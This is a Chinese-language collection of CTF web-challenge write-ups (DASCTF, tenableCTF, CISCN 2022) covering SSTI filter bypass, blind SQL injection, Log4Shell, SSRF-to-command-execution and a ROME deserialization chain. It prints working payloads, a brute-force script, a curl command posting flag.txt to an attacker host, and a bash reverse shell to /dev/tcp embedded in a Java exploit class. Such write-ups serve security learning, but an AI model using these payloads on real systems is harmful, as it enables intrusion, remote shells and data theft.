DASCTF2022 7月赛 - Harddisk
=========================

打开题目后以为是`SQL注入`，测试了一下发现输入的内容会回显回来，猜测是要考`SSTI`

使用`{{}}`被过滤了，接着使用`{%%}`可行，但是`print`关键字被过滤了，应该是要搞个无回显。

想用以前链子进行尝试，但是在调用`os库`时会报异常。由于没有回显，这里也不大清楚是为啥。于是改用了最原始的方法，构造思路如下

```php
{} # 类
↓↓↓
Object # 父类
↓↓↓
os._wrap_close # 调用的子类
↓↓↓
popen # 调用方法
```

接着要测试所过滤的字符了

```php

.
'
\x
[
]
requests
_
globals
getitem
init
...
```

过滤的内容很大，但是发现还是有一些可以调用的，如`attr`、`"`、`\u`、`\n`、`|`这些就差不多够用了。

通过`attr`过滤器调用需要的内容；然后使用`"`和`\u`主要是用于关键字过滤后，使用unicode编码进行绕过，这里应该也可以使用八进制来绕过；换行符主要是用于一些需要空格的地方

先构造`Object`类出来，这里可以用`{}|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")`来表示

接着调用`__subclasses__()`列出它的所有子类：`attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()`

由于这里无法判断我们需要的`os._wrap_close`类是第几个(没回显)，所以这里使用`for`循环+`if`判断的方式来判断

```php
{%for c in {}.__class__.__base__.__subclasses__()%}{if c.__name__ in "_wrap_close"}123{%endif%}{%endfor%}

↓↓↓

{%for%0ac%0ain%0a{}|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()%}{%if%0ac|attr("\u005f\u005f\u006e\u0061\u006d\u0065\u005f\u005f")in"\u005f\u0077\u0072\u0061\u0070\u005f\u0063\u006c\u006f\u0073\u0065"%}123{%endif%}{%endfor%}
```

最后调用去调用`popen`函数，由于`[]`被ban了，通过get方法去拿去字典中键名所对应的键值，然后执行命令即可，最后Payload如下

```php
{%for%0ac%0ain%0a{}|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()%}{%if%0ac|attr("\u005f\u005f\u006e\u0061\u006d\u0065\u005f\u005f")in"\u005f\u0077\u0072\u0061\u0070\u005f\u0063\u006c\u006f\u0073\u0065"%}{%if%0a(c|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"))|attr("\u0067\u0065\u0074")("\u0070\u006f\u0070\u0065\u006e")("cmd")%}123{%endif%}{%endif%}{%endfor%}
```

![image-20220724164957276.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-298ecdae2a13bd8d14124e1a715e9fa26b2a31dd.png)

DASCTF2022 7月赛 - 绝对防御
=====================

开局一张图，后面全靠猜。查看了一下js文件，都是与`ws`有关的，一开始以为要手动去连接，然后再进行注入(以前有道题好像就这样考的，当时有个人手注)。

看了好久没有思路，使用谷歌小插件收集了一波信息，发现存在一个php页面，如下图

![image-20220724170357490.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-217ef3f26adf139bf13d27847adcb2ee9a36d43d.png)

访问获取网页源码如下

```html
<script>

function getQueryVariable(variable)
{
       var query = window.location.search.substring(1);
       var vars = query.split("&");
       for (var i=0;i<vars.length;i++) {
               var pair = vars[i].split("=");
               if(pair[0] == variable){return pair[1];}
       }
       return(false);
}

function check(){
        var reg = /[`~!@#$%^&*()_+<>?:"{},.\/;'[\]]/im;
        if (reg.test(getQueryVariable("id"))) {
            alert("提示：您输入的信息含有非法字符！");
            window.location.href = "/"
         }
}
check()

</script>
```

通过Get请求传参id，测试后确认为数字型，并且表是3列，这里直接盲猜是id、username、password

其中数据：1是admin、2是flag

想用`union select`联合查询直接获取的，但是没成，感觉是数据库类型的原因；测试了`if`函数也不行。

用`like`就可以了，最后构造的语句为`2 and password like '%'#`，后端的SQL语句应该是`select username from users where id = 1 and password like '%'#`

写个脚本开始跑

```python
import requests

burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

flag = ""
s = "0123456789QAZXSWEDCVFRTGBNHYUJMKIOLP-{}"

for j in range(1, 120):
    for i in s:
        if i in "-{}":
            i = "\\"+i
        burp0_url = "http://eb97b9e9-5955-4ac4-b506-6499f21a7497.node4.buuoj.cn:81/SUPPERAPI.php?id=2 and password like '" + flag + i + "%25'%23"

        res = requests.get(burp0_url, headers=burp0_headers, allow_redirects=False)
        time.sleep(0.1)
        print str(j) + " : " + i
        if "flag" in res.text:
            flag += i
            print flag
            break
        if i == "\\}":
            print flag
            exit()

```

这里由于BUU的靶机不能请求太快，不然就会`429 Too Request`，所以加了一个sleep函数

![image-20220724172846920.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-c7c04712be93992975742700474dfa76387a5e3f.png)

tenableCTF - Log Forge
======================

题目中给了jar包，使用`jd-gui`反编译工具打开查看源码

![image-20220614170219977.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-11b9e0bd6293b5137f053758dce30c28f108c9b1.png)

查看`LogForgeSec.class`源码可知，其username和password的值都是通过配置文件读取的

![image-20220614170441213.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-134a112dde421e73509195ebfd817302b02a9d7a.png)

![image-20220614170456590.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-e0a234fb9ab37beda07dfab86f7fa7254d695970.png)

查看`LogForgeErrorController.class`源码可知，其中`dbgmsg`变量是可控的，并且从其渲染的文件中可知，可以利用该参数读取配置文件中的username和password

![image-20220614170736113.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-e41306c242e569b9f6d5cd12617b94b8c1e0fbbd.png)

![image-20220614170753537.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-b8bcb6c80577be5b60f9d76a0a387f1b41335d12.png)

读取username和password文件

![image-20220614170843483.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-ba68cd9647bd39b843bd1ce5c5fe08476035a209.png)

查看`LogForgeController.class`源码发现调用了`logger.info`，并且查看`pom.xml`可知`log4j-core`的版本为`2.14.0`存在漏洞

最后就是利用`CVE-2021-44228`

```php
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i vps -p 8080 -l 8089
```

![image-20220614171735562.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-105c73bc8ab3a7b545e4f8c6866d57bf6c834e01.png)

CISCN2022\_西北分区赛 - MagicProxy
=============================

主要的类就两个`ProxyController`和`AdminController`

`ProxyController`代码如下

```java
package BOOT-INF.classes.com.example.magicproxy.controller;

import com.example.magicproxy.utils.Utils;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class ProxyController {
  private static final int TIMEOUT = 29000;

  @GetMapping({"/proxy"})
  public void doProxy(@RequestParam String url, HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String urlParam = url;
    if (Utils.sanitizeUrl(urlParam)) {
      String ref = request.getHeader("referer");
      String ua = request.getHeader("User-Agent");
      String auth = request.getHeader("Authorization");
      try (ServletOutputStream null = response.getOutputStream()) {
        request.setCharacterEncoding("UTF-8");
        response.setCharacterEncoding("UTF-8");
        URL urlObject = new URL(urlParam);
        URLConnection connection = urlObject.openConnection();
        connection.setConnectTimeout(29000);
        connection.setReadTimeout(29000);
        response.setHeader("Cache-Control", "private, max-age=86400");
        if (auth != null)
          connection.setRequestProperty("Authorization", auth); 
        if (connection instanceof HttpURLConnection) {
          ((HttpURLConnection)connection)
            .setInstanceFollowRedirects(false);
          int status = ((HttpURLConnection)connection).getResponseCode();
          int counter = 0;
          while (counter++ <= 6 && status / 10 == 30) {
            String redirectUrl = connection.getHeaderField("Location");
            urlObject = new URL(redirectUrl);
            connection = urlObject.openConnection();
            if (auth != null)
              connection.setRequestProperty("Authorization", auth); 
            ((HttpURLConnection)connection)
              .setInstanceFollowRedirects(false);
            connection.setConnectTimeout(29000);
            connection.setReadTimeout(29000);
          } 
        } else {
          response.setStatus(415);
        } 
        servletOutputStream.flush();
      } catch (UnknownHostException|java.io.FileNotFoundException e) {
        response.setStatus(404);
      } catch (Exception e) {
        response.setStatus(500);
        e.printStackTrace();
      } 
    } else {
      response.setStatus(400);
    } 
  }
}

```

首先接收一个url参数，并对其进行检测，是否使用了`http/https`协议，并且不能使用本地IP地址，在检测后发起请求连接，可知这里存在一个受限的SSRF漏洞。接着它会判断响应包的状态码是否为`30x`，如果是会接收响应包中的跳转地址继续发起请求，此时并没有其他的检测，但请求完的内容并不会回显，所以这里是一个无回显的SSRF漏洞。代码中在发起请求时会先尝试接收`Headers`中的一个`Authorization`参数，这个参数在`AdminController`起作用

`AdminController`代码如下

```java
package BOOT-INF.classes.com.example.magicproxy.controller;

import java.io.IOException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Controller;
import org.springframework.util.Base64Utils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class AdminController {
  @GetMapping({"/admin"})
  public void Admin(@RequestParam String command, HttpServletRequest request, HttpServletResponse response) throws IOException {
    String ipAddress = request.getRemoteAddr();
    if (!ipAddress.equals("127.0.0.1")) {
      response.setStatus(HttpStatus.FORBIDDEN.value());
      return;
    } 
    request.setCharacterEncoding("UTF-8");
    String authorization = request.getHeader("Authorization");
    if (authorization == null) {
      response.setStatus(HttpStatus.UNAUTHORIZED.value());
      response.setHeader("WWW-Authenticate", "Basic realm=\"Realm\"");
    } else {
      String credentials = authorization.substring("Basic ".length());
      byte[] decodedCredentials = Base64Utils.decode(credentials.getBytes("UTF-8"));
      String[] arrays = (new String(decodedCredentials)).split(":");
      if (arrays != null && arrays.length == 2) {
        String username = arrays[0];
        String password = arrays[1];
        if ("Admin".equals(username) && "AdminE6fdEiU7".equals(password))
          Runtime.getRuntime().exec(command); 
      } 
    } 
  }
}
```

首先判断`ip`是否为本地发起的请求，然后接收`Headers`中的`Authorization`参数，取其`Basic`之后的值进行Base64解码，并以`:`为界将其断成两个字符串，最后分别比较是否为`Admin/AdminE6fdEiU7`，如果是就可以执行任意命令。

首先构造一个跳转的代码

```python
# coding:utf8
from flask import Flask,url_for,redirect,request
from werkzeug.routing import  BaseConverter

app = Flask(__name__)

@app.route('/')
def hello_world():
    return redirect('http://127.0.0.1:8080/admin?command=curl%20-X%20POST%20-F%20xx=@flag.txt%20http://vps:8989/', code=301)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
```

接着利用`/proxy`路由请求该重定向地址，并记得带上`Authorization:Basic QWRtaW46QWRtaW5FNmZkRWlVNw==`

![image-20220621154203433.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-0329d729e6bdb6af74bf8cb67a322808e112e73f.png)

最后即可接收到flag

![image-20220621153838209.png](https://shs3.b.qianxin.com/attack_forum/2022/07/attach-3275563c2340f8ec671e3038827104a3ee0af6d8.png)

CISCN2022\_华东北分区赛 - Java题
=========================

> 复现使用的环境 : jdk1.8.0\_65

根据`IndexController`类可知考察的是Java反序列利用，查看`pom.xml`文件没有添加啥依赖，但是题目给出了`ToStringBean`类，应该是考察的`ROME`链的反序列化。`ROME`链的触发基本是通过`TemplatesImpl`进行类加载，入口类有挺多的，这里使用`BadAttributeValueExpException`类作为入口类

调用链如下

```java
/*
TemplatesImpl.getOutputProperties()
ToStringBean.toString()
BadAttributeValueExpException.readObject()
*/
```

编写一个要加载的类 atao.java

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class atao extends AbstractTranslet {
    public void transform(DOM var1, SerializationHandler[] var2) throws TransletException {
    }

    public void transform(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
    }

    public atao() throws IOException {
        Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "exec bash -i &>/dev/tcp/ip/port <&1"});
    }
}
```

使用`javac`转成class文件

```shell
javac atao.java
```

**EXP**

```java
package com.game.ctf.Utils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class exp {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException {
        File file = new File("atao.class");
        FileInputStream fis = new FileInputStream(file);

        long fileSize = file.length();
        byte[] bytes = new byte[(int) fileSize];
        fis.read(bytes);

        TemplatesImpl templates = new TemplatesImpl();

        Class c = TemplatesImpl.class;
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, new byte[][] {bytes});

        Field name = c.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "atao");

        Field tfactory = c.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        ToStringBean bean = new ToStringBean(Templates.class, templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);

        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, bean);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));
    }
}

```

最后需要注意的是在发送数据时记得进行一次URL编码